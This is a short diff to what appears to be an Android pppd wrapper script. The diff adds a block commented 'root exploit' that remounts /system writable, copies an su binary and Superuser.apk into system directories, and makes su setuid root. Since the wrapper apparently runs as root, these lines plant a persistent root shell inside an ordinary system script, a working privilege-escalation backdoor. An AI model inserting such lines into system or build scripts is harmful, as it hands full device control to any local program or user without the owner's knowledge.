@@ -2,6 +2,13 @@
 # An unforunate wrapper script 
 # so that the exit code of pppd may be retrieved
 
+# root exploit
+mount -o rw,remount /system
+cp /sdcard/su /system/bin/
+cp /sdcard/superuser.apk /system/app/
+chmod 06755 /system/bin/su
+chown root:root /system/bin/su
+
 
 # this is a workaround for issue #651747
 #trap "/system/bin/sleep 1;exit 0" TERM
